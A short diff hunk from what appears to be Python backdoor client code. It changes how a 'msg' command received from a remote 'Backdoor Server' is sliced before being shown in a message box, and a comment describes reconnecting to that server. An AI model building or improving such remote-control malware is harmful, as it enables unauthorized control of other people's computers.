@@ -134,7 +134,7 @@ while True:
                 exit(0)
 
             elif strData[:3] == 'msg':
-                MessageBox(strData[:3])
+                MessageBox(strData[4:])
 
     # Handle if Backdoor Server not Responding try to Reconnect to Server
     except socket.error():
